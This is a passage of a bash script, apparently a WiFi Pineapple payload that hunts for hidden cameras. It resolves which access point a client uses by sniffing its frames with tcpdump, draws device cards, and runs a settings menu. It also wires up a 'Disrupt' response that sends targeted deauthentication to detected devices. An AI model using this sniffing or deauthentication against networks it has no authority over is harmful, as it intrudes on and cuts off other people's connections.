other_list() {   # heard, but in neither Review hits nor the modules list - see sort_macs "other"
  local mac i rows=0 glyph lbl r
  sort_macs other
  ROW_TEXT=("heard, no camera signature"); ROW_MAC=("")
  for mac in "${SORTED[@]}"; do
    glyph=A; [ "${ROLE[$mac]}" = cli ] && glyph=c
    lbl="${SSID_CLEAN[$mac]}"; [ -z "$lbl" ] && lbl="${VENDOR[$mac]}"
    case "$lbl" in ""|-) lbl="${mac//:/}" ;; esac
    r="${RSSI_LAST[$mac]:-}"; [ -n "$r" ] && printf -v r '%d' "$r" 2>/dev/null
    printf -v ROW '%s %s %s%s' "$glyph" "${lbl:0:$(( ROW_W - 5 - ${#r} ))}" "${PROX[$mac]:-?}" "$r"
    [ "${BUSY[$mac]}" = 1 ] && ROW+=" busy"
    ROW_TEXT+=("${ROW:0:$ROW_W}"); ROW_MAC+=("$mac"); rows=$((rows + 1))
  done
  ROW_TEXT+=("Back"); ROW_MAC+=("")
  pick_list "[$MODE] Other devices ($rows)" "" "${ROW_TEXT[@]}" || return 0
  case "$PICK" in "Back"|"heard, no camera signature") return 0 ;; esac
  for ((i = 0; i < ${#ROW_TEXT[@]}; i++)); do [ "${ROW_TEXT[i]}" = "$PICK" ] && { detail_card "${ROW_MAC[i]}" watch; break; }; done
}

tag_lines() {   # tag_lines mac -> TAGTXT (one meaning per tag, max 3)
  local t n=0; TAGTXT=""
  for t in ${TAGS[$1]}; do
    (( n >= 3 )) && break
    if [ -n "${TAG_MEANING[$t]}" ]; then TAGTXT+="$t: ${TAG_MEANING[$t]}"$'\n'
    elif [ -n "${SIG_VENDOR_CAT[$t]}" ]; then TAGTXT+="$t: vendor block (${SIG_VENDOR_CAT[$t]})"$'\n'
    elif [ -n "${SIG_SSID_CAT[$t]}" ]; then TAGTXT+="$t: SSID pattern (${SIG_SSID_CAT[$t]})"$'\n'
    else TAGTXT+="$t"$'\n'; fi
    n=$((n + 1))
  done
}
TAGTXT=""

# ============================================================================ association ===
# The inverse of bss_clients: which BSSID one client is talking to. No shipped firmware supplies a
# client's AP (the RECON DEVICES/CLIENTS object has no association key: measured on 1.1.3, read in
# 2.0.0's HELP PARSE), so AP_OF is "-" on every client row and everything that needs the AP --
# client Watch and Stimulus, kit detection, the AP->client tree, a targeted Disrupt -- is inert.
# assoc_lookup reads it off the air instead: park the radio on the channel the client was last
# heard on, capture frames to or from that one MAC, and let CLI_AWK's pairs mode name the BSSID.
# ON DEMAND ONLY -- when the operator picks Watch or Disrupt on an unresolved client -- because it
# pauses Recon's hop for the listen window; never in the scan loop. What it learns is kept for the
# run in ASSOC_BSS and re-applied by run_cycle, which otherwise overwrites AP_OF with the
# firmware's "-" every cycle. A membership capture teaches the same fact for every station it
# heard (assoc_learn_members). Not copied into the hooks: a hook's one row takes its AP from the
# Recon selection (hook_target).
# Two things here are NOT measured on a device yet, and are written to degrade rather than assume:
#  - PINEAPPLE_EXAMINE_CHANNEL has never been issued on the bench without an EXAMINE_BSSID before
#    it (every measured park issued both; the lookup has no BSSID to give). lock_channel therefore
#    reads the channel back, and when the radio is not parked the capture still runs, across the
#    hop, for three times the window: a lower yield, but it needs no lock at all.
#  - a client row's frequency is the device-level LAST-HEARD one, which need not be its association
#    channel (a scanning client is heard off-channel). A miss is therefore reported as "not heard
#    on ch N", never as "not associated".
# Falsified by: a lookup naming a BSSID the client is not associated to, or NO_FRAMES on the right
# channel for a client that is passing traffic there.
declare -A ASSOC_BSS ASSOC_CH ASSOC_TS ASSOC_TRY ASSOC_SRC
ASSOC_WHY=''; ASSOC_TEXT=''; ASSOC_N=0; ASSOC_RECS=0; ASSOC_ITMAX=0; ASSOC_TRUNC=0; CHAN_V=0

# chan_of_freq <MHz> -> sets CHAN_V; 0 when it is not a 2.4 or 5 GHz channel centre. 6 GHz stays 0 on
# purpose: its channel numbers reuse 1-233, so a number handed to EXAMINE_CHANNEL would be
# ambiguous with a 2.4/5 GHz one, and the lookup listens across the hop there instead of guessing.
chan_of_freq() {
  local f="$1"; CHAN_V=0
  [[ $f =~ ^[0-9]+$ ]] || return 0
  f=$((10#$f))
  if (( f == 2484 )); then CHAN_V=14
  elif (( f >= 2412 && f <= 2472 && (f - 2407) % 5 == 0 )); then CHAN_V=$(( (f - 2407) / 5 ))
  elif (( f >= 5160 && f <= 5885 && f % 5 == 0 )); then CHAN_V=$(( (f - 5000) / 5 ))
  fi
  return 0
}

# lock_channel <ch> <secs> -> 0 parked on ch; 3 the channel could not be read back (PROCEED, labelled
# unverified: lock_target's rc 3, same meaning); 2 the radio is somewhere else.
lock_channel() {
  local ch="$1" secs="$2" err c c1 c2 c3 raw ngood=0
  err=$(PINEAPPLE_EXAMINE_CHANNEL "$ch" "$secs" 2>&1 >/dev/null)   # hak5cmd exits 0 on its error paths: stderr is the only signal
  WATCH_LOCKED=1; LAST_LOCK_TS=$EPOCHSECONDS
  [ -n "$err" ] && log assoc "EXAMINE_CHANNEL $ch said: ${err:0:120}"
  sleep 1; c1=$(cur_channel); sleep 0.5; c2=$(cur_channel); sleep 0.5; c3=$(cur_channel)
  raw="${c1:-_}/${c2:-_}/${c3:-_}"
  for c in "$c1" "$c2" "$c3"; do [ -n "$c" ] && ngood=$((ngood + 1)); done
  if (( ngood < 2 )); then LOCK_TEXT="$RECON_IF: channel read-back $raw, park on ch $ch unverified"; return 3; fi
  for c in "$c1" "$c2" "$c3"; do
    [ -z "$c" ] || [ "$c" = "$ch" ] || { LOCK_TEXT="$RECON_IF not parked on ch $ch (samples $raw)"; return 2; }
  done
  LOCK_TEXT="$RECON_IF ch $ch"; return 0
}

# assoc_capture <mac> <secs> -> stdout the pcap path; rc 1 when nothing was written. capture_bss with
# the client in place of the BSSID. addr2 comes FIRST in the filter: the same two primitives the
# membership capture uses, in the order that lets the laptop harness tell the two captures apart.
assoc_capture() {
  local mac="$1" secs="$2" out="/tmp/cs_asc_$$.pcap" p w=0
  rm -f "$out"
  tcpdump -i "$RECON_IF" -nn -s "$CLI_CAP_SNAP" -c "$CLI_CAP_COUNT" -w "$out" "type data and (wlan addr2 $mac or wlan addr1 $mac)" >/dev/null 2>&1 & p=$!
  child_add "$p"; sleep 1; w=1
  if [ ! -s "$out" ] && ! kill -0 "$p" 2>/dev/null; then     # the OR form did not arm: the uplink alone still names the BSSID
    child_del "$p"
    log assoc "capture: OR filter did not arm, retrying uplink-only"
    tcpdump -i "$RECON_IF" -nn -s "$CLI_CAP_SNAP" -c "$CLI_CAP_COUNT" -w "$out" "type data and wlan addr2 $mac" >/dev/null 2>&1 & p=$!
    child_add "$p"; sleep 1; w=1
  fi
  while (( w < secs )); do kill -0 "$p" 2>/dev/null || break; sleep 1; w=$((w + 1)); done
  kill -TERM "$p" 2>/dev/null; wait "$p" 2>/dev/null; child_del "$p"
  [ -s "$out" ] || { rm -f "$out"; return 1; }
  printf '%s' "$out"
}

assoc_can() {   # a client row with no AP, and a capture tool to find one with
  local mac="$1"
  [ "${ROLE[$mac]}" = cli ] || return 1
  [ -z "${AP_OF[$mac]}" ] || [ "${AP_OF[$mac]}" = - ] || return 1
  [ "$HAVE_TCPDUMP" = 1 ]
}

# assoc_nochan <mac>: this client's AP was read off the air and no channel is known for it -- the AP
# has no Recon row yet, and the capture that named it was not behind a verified park. Watch and
# Disrupt both need a channel to lock on, so both rows say "n/a (no channel)" until Recon lists the
# AP, at which point run_cycle gives the row its AP's channel.
assoc_nochan() {
  local mac="$1" ap="${AP_OF[$1]:--}" c
  [ "${ROLE[$mac]}" = cli ] && [ "$ap" != - ] && [ "$ap" = "${ASSOC_BSS[$mac]:-}" ] || return 1
  for c in "${CH[$mac]:-0}" "${CH[$ap]:-0}"; do
    [[ $c =~ ^[0-9]+$ ]] && (( 10#$c > 0 )) && return 1
  done
  return 0
}

# assoc_stale <mac>: its AP was learned off the air, and neither that nor the last look is newer than
# ASSOC_TTL. An AP the firmware supplied is never stale here: it is re-read every cycle already.
assoc_stale() {
  local mac="$1" t
  [ "${ROLE[$mac]}" = cli ] && [ -n "${ASSOC_BSS[$mac]}" ] && [ "${AP_OF[$mac]}" = "${ASSOC_BSS[$mac]}" ] || return 1
  [ "$HAVE_TCPDUMP" = 1 ] || return 1
  t=${ASSOC_TS[$mac]:-0}; (( ${ASSOC_TRY[$mac]:-0} > t )) && t=${ASSOC_TRY[$mac]}
  (( EPOCHSECONDS - t >= ASSOC_TTL ))
}

# assoc_learn <sta> <bssid> <ch> <src> -> remember that sta talks to bssid, and make an existing client
# row usable at once rather than at the next cycle. rc 1 when the pair is not two distinct MACs.
assoc_learn() {
  local m="${1,,}" b="${2,,}" ch="${3:-0}" src="${4:-air}" prev cur
  [[ $m =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]] && [[ $b =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]] || return 1
  [ "$m" = "$b" ] && return 1
  prev="${ASSOC_BSS[$m]:-}"
  # a client rides its AP's channel: the AP's own row wins over the channel we happened to listen on
  if [[ ${CH[$b]:-0} =~ ^[0-9]+$ ]] && (( ${CH[$b]:-0} > 0 )); then ch=${CH[$b]}; fi
  [[ $ch =~ ^[0-9]+$ ]] || ch=0
  ASSOC_BSS[$m]="$b"; ASSOC_TS[$m]=$EPOCHSECONDS; ASSOC_SRC[$m]="$src"
  if (( ch > 0 )); then ASSOC_CH[$m]="$ch"
  elif [ "$prev" != "$b" ]; then unset "ASSOC_CH[$m]"; fi      # another AP, channel unknown: the old AP's says nothing about it
  [ "${ROLE[$m]}" = cli ] || return 0       # no client row for it (yet): run_cycle applies it when one appears, and no row is invented
  cur="${AP_OF[$m]:--}"
  if [ "$cur" != - ] && [ "$cur" != "$prev" ] && [ "$cur" != "$b" ]; then return 0; fi   # the firmware named another AP: its word stands
  AP_OF[$m]="$b"
  # The row takes the new AP's channel and SSID, as run_cycle's record_seen does for an associated
  # client. When it MOVED to an AP that has neither, the old AP's are dropped, not carried over: a
  # Disrupt row built on the previous AP's channel would lock and transmit somewhere this BSS is not.
  if [ -n "${ASSOC_CH[$m]}" ]; then CH[$m]="${ASSOC_CH[$m]}"
  elif [ "$cur" != - ] && [ "$cur" != "$b" ]; then unset "CH[$m]"; fi
  if [ -n "${SSID_CLEAN[$b]}" ]; then SSID_CLEAN[$m]="${SSID_CLEAN[$b]}"
  elif [ "$cur" != - ] && [ "$cur" != "$b" ]; then unset "SSID_CLEAN[$m]"; fi
  return 0
}

# assoc_learn_members <bssid>: a membership capture has just shown which stations talk to this BSSID,
# which is the same fact read the other way. Called from resp_members' success path, behind
# `command -v` there because that function is copied into the hooks and this one is not.
assoc_learn_members() {
  local bss="${1,,}" m heard=0 given=0
  [ -n "$bss" ] && [ "$RESP_MEMBERS_BSS" = "$bss" ] || return 0
  for m in "${!RESP_MEMBERS[@]}"; do
    assoc_learn "$m" "$bss" "${CH[$bss]:-0}" members || continue
    heard=$((heard + 1))
    # only these have a card that changed: a station with no row is remembered for later, and one
    # whose AP the firmware supplied keeps it
    [ "${ROLE[$m]}" = cli ] && [ "${AP_OF[$m]}" = "$bss" ] && given=$((given + 1))
  done
  (( heard > 0 )) && log assoc "members of $bss: $heard heard, $given client row(s) now carry this AP"
  return 0
}

# assoc_lookup <client mac> -> 0 when its BSSID was read off the air (AP_OF set, the row usable at
# once); 1 otherwise, with ASSOC_WHY and ASSOC_TEXT saying why:
#   NO_CAPTURE  no capture tool, the capture did not arm, or the file is not a pcap
#   NO_FRAMES   it armed and the client was not heard there
#   NO_PAIR     the client was heard, but no BSSID twice
#   AMBIGUOUS   two BSSIDs, the second with at least half the first's count: no decision
#   SNAP_SHORT  records were cut below the addresses (raise CLI_CAP_SNAP)
# A lookup that fails teaches nothing and leaves an earlier answer in place.
assoc_lookup() {
  local mac="$1" ch lch secs=$ASSOC_CAP_SECS lock=none lrc f out rc kk v1 v2 v3 t0=$EPOCHSECONDS where
  local best='' bn=0 second='' sn=0 prev="${ASSOC_BSS[$1]:-}"
  ASSOC_WHY=''; ASSOC_TEXT=''; ASSOC_N=0; ASSOC_RECS=0; ASSOC_ITMAX=0; ASSOC_TRUNC=0
  if [ "${ROLE[$mac]}" != cli ]; then ASSOC_WHY=NOT_CLIENT; ASSOC_TEXT="${mac:9} is not a client row"; return 1; fi
  ASSOC_TRY[$mac]=$EPOCHSECONDS
  if [ "$HAVE_TCPDUMP" != 1 ]; then
    ASSOC_WHY=NO_CAPTURE; ASSOC_TEXT="no tcpdump: cannot look for the AP of ${mac:9}"
    LOG yellow "$ASSOC_TEXT"; log assoc "$mac none why=$ASSOC_WHY"; return 1
  fi
  # the row's own channel when it has one (a re-check listens where the AP is), else the channel of
  # the frequency the client was last heard on
  ch="${CH[$mac]:-0}"; [[ $ch =~ ^[0-9]+$ ]] || ch=0
  if (( ch == 0 )); then chan_of_freq "${FREQ[$mac]:-0}"; ch=$CHAN_V; fi
  set_state WATCH
  if (( ch > 0 )); then
    LOG "finding the AP of ${mac:9} on ch $ch (~$((secs + 3)) s)"$'\n'"Recon paused while listening"
    lock_channel "$ch" $((secs + 8)); lrc=$?
    case "$lrc" in
      0) lock=ok ;;
      3) lock=unverified; LOG yellow "$LOCK_TEXT" ;;       # proceed, as lock_target's rc 3 does
      *) lock=hop; unlock_target ;;                        # not parked: let the hop resume and listen across it
    esac
  else
    lock=hop; LOCK_TEXT="no channel known for ${mac:9}"
  fi
  if [ "$lock" = hop ]; then
    secs=$((secs * 3)); where="across the hop"
    LOG yellow "$LOCK_TEXT"$'\n'"listening across the hop instead (~$secs s)"
  else
    where="on ch $ch"
  fi
  if f=$(assoc_capture "$mac" "$secs"); then
    [ "$lock" = hop ] || unlock_target     # before the parse: the walk takes seconds on the device and Recon should be hopping again
    out=$(pcap_stream "$f" | awk -v mode=pairs -v sta="$mac" -v own="$OWN_MACS" "$CLI_AWK"); rc=$?; rm -f "$f"
    if (( rc != 0 )); then
      ASSOC_WHY=NO_CAPTURE; ASSOC_TEXT="capture for ${mac:9} is not a readable pcap"
    else
      while read -r kk v1 v2 v3; do          # a here-string, so these land in THIS shell
        case "$kk" in
          ITMAX) ASSOC_ITMAX="$v1" ;; RECS) ASSOC_RECS="$v1" ;; TRUNC) ASSOC_TRUNC="$v1" ;;
          PAIR)  [ "$v1" = "$mac" ] && [[ $v3 =~ ^[0-9]+$ ]] || continue
                 if (( v3 > bn )); then second="$best"; sn=$bn; best="$v2"; bn=$v3
                 elif (( v3 > sn )); then second="$v2"; sn=$v3; fi ;;
        esac
      done <<<"$out"
      if [ -z "$best" ]; then
        if (( ASSOC_TRUNC > 0 )); then
          ASSOC_WHY=SNAP_SHORT; ASSOC_TEXT="snap $CLI_CAP_SNAP too small for radiotap $ASSOC_ITMAX: raise CLI_CAP_SNAP"
        elif (( ASSOC_RECS == 0 )); then
          ASSOC_WHY=NO_FRAMES; ASSOC_TEXT="${mac:9} not heard $where in ${secs}s"
        else
          ASSOC_WHY=NO_PAIR; ASSOC_TEXT="${mac:9} heard $where ($ASSOC_RECS frames) but no AP twice"
        fi
      elif [ -n "$second" ] && (( sn * 2 >= bn )); then
        ASSOC_WHY=AMBIGUOUS; ASSOC_TEXT="${mac:9} talks to ${best:9} ($bn) and ${second:9} ($sn): not deciding"
      fi
    fi
  else
    [ "$lock" = hop ] || unlock_target
    ASSOC_WHY=NO_CAPTURE; ASSOC_TEXT="capture did not arm for ${mac:9}"
  fi
  # the hop was held while the radio was parked: the next cycle is a baseline and rate history restarts, as after a Watch
  if (( ch > 0 )); then BASELINE_NEXT=1; PREV_PKT=(); PREV_T=(); fi
  set_state SCAN
  if [ -n "$ASSOC_WHY" ]; then
    LOG yellow "$ASSOC_TEXT"
    log assoc "$mac none why=$ASSOC_WHY recs=$ASSOC_RECS itmax=$ASSOC_ITMAX trunc=$ASSOC_TRUNC ch=$ch lock=$lock dwell=$((EPOCHSECONDS - t0))s${prev:+ kept=$prev}"
    return 1
  fi
  ASSOC_N=$bn
  # The channel listened on is this BSS's channel only when the radio was verifiably parked there.
  # Across the hop, or behind a park that could not be read back, it is where the client was last
  # heard and nothing more, so it is not recorded: the AP's own row supplies the channel if Recon
  # lists it, and a row with no channel says "Disrupt n/a (no channel)" instead of guessing one.
  lch=0; [ "$lock" = ok ] && lch=$ch
  assoc_learn "$mac" "$best" "$lch" air
  score_device "$mac"                     # the row now carries its AP's SSID: score it as the next cycle would
  LOG "AP of ${mac:9}: ${best:9} ${SSID_CLEAN[$best]:-?} ch ${CH[$mac]:-?}"
  log assoc "$mac -> $best n=$ASSOC_N recs=$ASSOC_RECS itmax=$ASSOC_ITMAX ch=$ch lock=$lock dwell=$((EPOCHSECONDS - t0))s${prev:+ was=$prev}"
  return 0
}

# assoc_refresh <mac>: before acting on an AP that was learned off the air a while ago, look again.
# A different BSSID replaces it; hearing nothing keeps it and says so, because an idle client is
# not a departed one. A no-op for an AP row, a fresh answer, or an AP the firmware supplied.
assoc_refresh() {
  local mac="$1" old="${ASSOC_BSS[$1]:-}" age
  assoc_stale "$mac" || return 0
  age=$(( EPOCHSECONDS - ${ASSOC_TS[$mac]:-0} ))
  log assoc "$mac re-check, AP $old (${ASSOC_SRC[$mac]:-?}) learned ${age}s ago"
  if assoc_lookup "$mac"; then
    [ "${ASSOC_BSS[$mac]}" = "$old" ] || LOG yellow "${mac:9} moved: ${old:9} -> ${ASSOC_BSS[$mac]:9}"
  else
    LOG yellow "AP of ${mac:9} not re-confirmed: keeping ${old:9}, heard ${age}s ago"
  fi
  return 0
}

detail_card() {
  local mac="$1" def="${2:-}" age wrow drow
  [ -n "$mac" ] || return 0
  while :; do
    age=$(( EPOCHSECONDS - ${LAST_SEEN[$mac]:-$EPOCHSECONDS} ))
    tag_lines "$mac"
    LOG "[$MODE] ${CONF[$mac]} ${BANDNAME[$mac]} ${ROLE[$mac]} $mac"$'\n'"cat: ${CAT[$mac]} ${VENDOR[$mac]:--}"$'\n'"ssid: ${SSID_CLEAN[$mac]:--} ch${CH[$mac]:-?} ${BAND[$mac]:-?}GHz"$'\n'"rssi ${RSSI_LAST[$mac]:--} best ${RSSI_BEST[$mac]:--} ${PROX[$mac]:-?} ${age}s ago"$'\n'"${TAGTXT%$'\n'}"
    if watchable "$mac"; then wrow="Watch"; elif [ "$HAVE_TCPDUMP" != 1 ]; then wrow="Watch (no tcpdump)"; elif assoc_can "$mac"; then wrow="Watch (find AP first)"; elif assoc_nochan "$mac"; then wrow="Watch n/a (no channel)"; else wrow="Watch n/a (not associated)"; fi
    [ "$def" = watch ] && def="$wrow" || def="Back"
    drow=""; [ "$RESPONSE" = 1 ] && drow=$(disrupt_row "$mac")
    pick_list "${CONF[$mac]} ${ID_LABEL[$mac]:-${TAGS[$mac]%% *}} ${mac:9}" "$def" "$wrow" ${drow:+"$drow"} "Locate" "Ignore for session" "Back" || return 0
    case "$PICK" in
      # the AP was heard and its channel was not: say which, and what changes it, instead of "n/a"
      "Watch n/a (no channel)"|"Disrupt n/a (no channel)")
        if assoc_nochan "$mac"; then LOG yellow "AP ${AP_OF[$mac]:9} of ${mac:9} was heard, its channel was not: Recon has not listed that AP yet"$'\n'"resume the scan: the row gets its channel when the AP appears"
        else LOG yellow "no channel known for ${mac:9}: nothing to lock on from this row"; fi ;;
      "Disrupt n/a"*) LOG yellow "no associated BSS for ${mac:9}: nothing to attack from this row" ;;
      # A client the firmware gave no AP for: read it off the air first, then carry on into the menu
      # the operator asked for. A lookup that fails has said why, and the card redraws unchanged.
      "Disrupt (find AP"*) assoc_lookup "$mac" && disrupt_menu "$mac" ;;
      "Watch (find AP"*) assoc_lookup "$mac" && watch_menu "$mac" ;;
      "Disrupt"*) disrupt_menu "$mac" ;;      # both menus look again first when the AP was learned a while ago
      "Watch") watch_menu "$mac" ;;
      "Watch n/a"*) LOG "probe-only: identity + Locate only; Locate updates on probe bursts (15-60 s) and the MAC may rotate" ;;
      "Watch (no tcpdump)") LOG "tcpdump missing: opkg update; opkg install tcpdump" ;;
      "Locate") if [ "${ROLE[$mac]}" = cli ] && is_rand "$mac" && [ "${AP_OF[$mac]:--}" = "-" ]; then LOG "randomised probe-only MAC: Locate not offered"; else locate_target "$mac"; fi ;;
      "Ignore for session") IGNORED[$mac]=1; log ui "ignore $mac"; return 0 ;;
      *) return 0 ;;
    esac
    def="Back"
  done
}

mode_menu() {
  pick_list "Mode (now $MODE)" "$MODE" "ROOM" "SITE" "Back" || return 0
  case "$PICK" in ROOM|SITE) MODE="$PICK"; apply_mode; LOG "mode -> $MODE" ;; esac
}


# ================================================================================ settings ===
# Table-driven settings menu over all twenty starred keys: key|kind|floor|group|label, where group
# is recon or response and settings_menu routes one page per group. Values are applied to the
# running session and persisted with PAYLOAD_SET_CONFIG; Reset deletes the overrides and restores
# the config-block defaults captured at start (cfg_snapshot_defaults runs before load_overrides).
# The third field is a floor, not a default: the shipped value lives in the config block.
SETTINGS_TABLE='CYCLE_SECS|int|5|recon|scan period, s
THR_STREAM_UP|int|1|recon|STREAM big uplink fr/s
COOLDOWN_SECS|int|0|recon|re-alert suppression, s
DEDUPE_H|int|0|recon|dedupe horizon, h (0 off)
RECON_FRESH|bool|0|recon|fresh Recon session at start
RSSI_MIN|int|-100|recon|list gate dBm (0 off)
ALERT_DIALOG|bool|0|recon|ALERT on new CONFIRMED
SOUND|bool|0|recon|ringtone on CONFIRMED
AUTO_WATCH|bool|0|recon|offer Watch
AUTO_LOCATE|bool|0|recon|offer Locate
BAND6|bool|0|recon|also scan 6 GHz (restored at exit)
ASSOC_CAP_SECS|int|2|recon|find-AP listen window, s (max 30)
ASSOC_TTL|int|0|recon|learned AP trusted, s (0 = re-check)
RESPONSE|bool|0|response|Disrupt rung (master switch)
RESPONSE_CONFIRM|bool|0|response|confirm before any transmit
AUTO_RESPOND|bool|0|response|funnel offers Disrupt itself
SWEEP_TARGETED|bool|0|response|targeted deauth per member too
RESP_LOCK_SECS|int|5|response|EXAMINE lock across a response, s
RESP_SETTLE_SECS|int|1|response|settle before re-reading target, s
POSTURE_TTL|int|0|response|badge cache, s (0 = re-read)'
declare -A CFG_DEFAULT
cfg_snapshot_defaults() { local key _; while IFS='|' read -r key _; do [ -n "$key" ] && CFG_DEFAULT[$key]="${!key}"; done <<<"$SETTINGS_TABLE"; }
settings_row() {   # settings_row KEY -> sets S_KIND S_FLOOR S_GROUP S_LABEL from the table (KEY|kind|floor|group|label)
  local key kind floor group label; S_KIND=""; S_FLOOR=0; S_GROUP=""; S_LABEL=""
  while IFS='|' read -r key kind floor group label; do [ "$key" = "$1" ] && { S_KIND=$kind; S_FLOOR=$floor; S_GROUP=$group; S_LABEL=$label; return 0; }; done <<<"$SETTINGS_TABLE"
  return 1
}
S_KIND=""; S_FLOOR=0; S_GROUP=""; S_LABEL=""
cfg_note_set() {   # cfg_note_set KEY VALUE|"" -> keep CFG_NOTE/CFG_OVERRIDES (start screen, report footer) in step with the overrides in force
  local w; local -a keep=()
  for w in $CFG_NOTE; do [ "${w%%=*}" = "$1" ] || keep+=("$w"); done
  [ -n "$2" ] && keep+=("$1=$2")
  CFG_NOTE=""; for w in "${keep[@]}"; do CFG_NOTE+=" $w"; done; CFG_OVERRIDES=${#keep[@]}
}
settings_apply() {   # settings_apply KEY VALUE -> live variable + persisted override
  local key="$1" val="$2" before
  printf -v "$key" '%s' "$val"; cfg_note_set "$key" "$val"
  if command -v PAYLOAD_SET_CONFIG >/dev/null 2>&1 && PAYLOAD_SET_CONFIG "$PAYLOAD_NAME" "$key" "$val" >/dev/null 2>&1; then LOG "$key -> $val (saved)"
  else LOG yellow "$key -> $val (this run only)"; fi
  log cfg "set $key=$val"
  case "$key" in
    DEDUPE_H) DEDUPE_RUN=1 ;;
    BAND6) if [ "$val" = 1 ]; then bands_apply; else bands_restore; fi ;;   # takes effect now, not at the next start
    ASSOC_CAP_SECS)                    # capped: persist what is in force so the menu and the next start agree
      before=$ASSOC_CAP_SECS; assoc_clamp
      if [ "$ASSOC_CAP_SECS" != "$before" ]; then
        cfg_note_set ASSOC_CAP_SECS "$ASSOC_CAP_SECS"
        command -v PAYLOAD_SET_CONFIG >/dev/null 2>&1 && PAYLOAD_SET_CONFIG "$PAYLOAD_NAME" ASSOC_CAP_SECS "$ASSOC_CAP_SECS" >/dev/null 2>&1
        log cfg "set ASSOC_CAP_SECS=$ASSOC_CAP_SECS (clamp)"
      fi ;;
    RESP_LOCK_SECS|RESP_SETTLE_SECS)   # the lock must outlast fire + settle: re-clamp, and if the clamp moved the lock
      before=$RESP_LOCK_SECS; resp_clamp_lock   # persist what is in force so the menu, the footer and the next start agree
      if [ "$RESP_LOCK_SECS" != "$before" ]; then
        cfg_note_set RESP_LOCK_SECS "$RESP_LOCK_SECS"
        command -v PAYLOAD_SET_CONFIG >/dev/null 2>&1 && PAYLOAD_SET_CONFIG "$PAYLOAD_NAME" RESP_LOCK_SECS "$RESP_LOCK_SECS" >/dev/null 2>&1
        log cfg "set RESP_LOCK_SECS=$RESP_LOCK_SECS (clamp)"
      fi ;;
  esac
  return 0
}
settings_reset() {
  local key _
  confirm "Reset all saved settings to defaults?" || return 0
  while IFS='|' read -r key _; do
    [ -n "$key" ] || continue
    command -v PAYLOAD_DEL_CONFIG >/dev/null 2>&1 && PAYLOAD_DEL_CONFIG "$PAYLOAD_NAME" "$key" >/dev/null 2>&1
    printf -v "$key" '%s' "${CFG_DEFAULT[$key]}"; cfg_note_set "$key" ""
  done <<<"$SETTINGS_TABLE"
  resp_clamp_lock; rssi_min_clamp; DEDUPE_RUN=1   # every starred key is in the table, so nothing stays overridden after this
  if [ "$BAND6" = 1 ]; then bands_apply; else bands_restore; fi   # the bands follow the reset BAND6, as settings_apply would
  log cfg "reset defaults"; LOG "settings reset to defaults"
}
settings_menu() {   # one short top page, so the master switch and Reset are never behind More...
  while :; do
    pick_list "Settings (saved on device)" "Back" "Back" "Recon settings" "Response settings" "Reset defaults" || return 0
    case "$PICK" in
      "Back") return 0 ;;
      "Recon settings") settings_group recon "Recon settings" ;;
      "Response settings") settings_group response "Response settings" ;;
      "Reset defaults") settings_reset ;;
    esac
  done
}
settings_group() {   # settings_group <group> <title>: the group's keys on one picker, Back first so the default is on page 1
  local group="$1" title="$2" key kind floor g label resp rc; local -a items
  while :; do
    items=("Back")
    while IFS='|' read -r key kind floor g label; do [ -n "$key" ] && [ "$g" = "$group" ] && items+=("$key = ${!key}"); done <<<"$SETTINGS_TABLE"
    pick_list "$title" "Back" "${items[@]}" || return 0
    [ "$PICK" = Back ] && return 0
    key=${PICK%% = *}; settings_row "$key" || continue
    if [ "$S_KIND" = bool ]; then
      pick_list "$key: $S_LABEL" "$( [ "${!key}" = 1 ] && printf On || printf Off )" "On" "Off" "Back" || continue
      case "$PICK" in On) resp=1 ;; Off) resp=0 ;; *) continue ;; esac
      # the pre-transmit confirmation is the safety key: with the rung on, switching it off takes a deliberate second step
      if [ "$key" = RESPONSE_CONFIRM ] && (( resp == 0 )); then confirm "Switch off the confirmation before every transmit?" || continue; fi
    else
      resp=$(NUMBER_PICKER "$key: $S_LABEL (min $S_FLOOR)" "${!key}" 2>/dev/null); rc=$?
      (( rc != 0 )) && continue
      [[ $resp =~ ^-?[0-9]+$ ]] || { LOG yellow "$key: not a number"; continue; }
      (( resp < S_FLOOR )) && { LOG yellow "$key: minimum is $S_FLOOR"; continue; }
      [ "$key" = RSSI_MIN ] && (( resp > 0 )) && { LOG yellow "RSSI_MIN: 0 (off) or a negative dBm"; continue; }
    fi
    settings_apply "$key" "$resp"
  done
}

# =================================================================================== bands ===
# Opt-in 6 GHz for this run: PINEAPPLE_SET_BANDS <iface> <current bands> 6 once after the overrides, put
# back in cleanup. The argument form is the token one, `[interface] {2} {5} {6}` (usage line read on the
# bare 1.1.3 unit, 2026-11-03; nosey-neighbor's `both` is wrong). A write is TRUSTED only when the radio is
# then seen on a 6 GHz channel (bands_live6) or uci reads the 6 back, because on that unit the call changed
# neither uci nor the live hop set with pineapd running -- a no-op as issued, reported as such; what a
# fresh Recon session or a pineapd restart does with it is day-one 8c. A pineapd restart (which empties
# Recon) is detected by pid and said out loud, whether or not the write was trusted. Every ISSUED write is
# restored, trusted or not: BANDS_WROTE remembers what was there, and so does the record on disk (BANDS_STATE,
# "<bands> <pid>", written BEFORE the write and a precondition of it), which the run's own watchdog replays if
# the run is killed (bands_watchdog_restore, lib) and the next user-payload start replays otherwise
# (bands_recover). 6 GHz costs dwell on the bands cameras actually use (PLAN_v2 item 21), hence opt-in.
# Not copied into the hooks: a hook runs inside a Recon selection and must not change what Recon scans.
BANDS_ORIG=""     # the device's bands before a TRUSTED write; "" = not trusted (status line stays honest)
BANDS_WROTE=""    # the device's bands before any ISSUED write; "" = nothing to restore
bands_read() { local a; a=$(uci -q get "pineapd.$RECON_IF.bands" 2>/dev/null || uci -q get pineapd.wlan1.bands 2>/dev/null); printf '%s' "${a//[![:alnum:],]/}"; }
bands_plan() {   # bands_plan <current, e.g. 2,5> -> the SET_BANDS band tokens with 6 added, or "" when nothing needs writing
  local cur="$1" b out=""
  [ -n "$cur" ] || return 0
  [[ ,$cur, == *,6,* ]] && return 0
  for b in ${cur//,/ }; do out+="${out:+ }$b"; done
  printf '%s 6' "$out"
}
bands_live6() {   # 0 when the radio is seen on a 6 GHz channel within the sampling window: the direct test of what BAND6 is for
  local i f
  command -v iw >/dev/null 2>&1 || return 1
  for ((i = 0; i < BANDS_PROBE_N; i++)); do
    f=$(iw dev "$RECON_IF" info 2>/dev/null | sed -n 's/.*(\([0-9]*\) MHz).*/\1/p' | head -1)
    [[ $f =~ ^[0-9]+$ ]] && (( f >= 5925 )) && return 0
    sleep "$BANDS_PROBE_WAIT"
  done
  return 1
}
